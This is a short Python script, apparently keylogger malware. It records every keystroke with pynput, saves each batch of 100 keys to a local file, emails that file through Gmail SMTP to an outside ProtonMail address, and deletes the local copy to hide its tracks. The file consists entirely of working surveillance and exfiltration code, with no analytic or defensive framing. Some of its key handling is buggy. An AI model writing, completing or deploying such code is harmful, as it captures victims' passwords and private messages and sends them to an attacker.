from pynput.keyboard import Key, Listener
import threading
import smtplib
from email.message import EmailMessage
import os

keys = []



def write_email():
  email_addr = ""
  passw = ""


  mess = EmailMessage()
  mess["Subject"] = "Logs in 5mins"
  mess["From"] = email_addr
  mess["To"] = "CCWPRANSOM@protonmail.com"
  mess.set_content("Here u go")



  with open("keylog.txt", "rb") as l:
    we = l.read()
    k = l.name
  
    mess.add_attachment(we, maintype="text", subtype ="plain", filename=k)

  with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()

    smtp.login(email_addr, passw)
    smtp.send_message(mess)
  
  for x in keys:
    keys.remove(x)
   
  os.remove("keylog.txt")




def writing_to_file():
  with open("keylog.txt", "w") as f:
    for k in keys:
      f.write(k)



def press(key):  
  key = str(key)
  if key == Key.space:
    keys.append(" ")
  
  elif key == Key.backspace:
    if len(keys) == 0:
      keys.append(" ")
    
    else:
      keys.remove(keys[-1])

  else:
    keys.append(key)
    print(key)

  if len(keys) == 100:
    writing_to_file()
    write_email()

with Listener(on_press= press) as l:
  l.join()



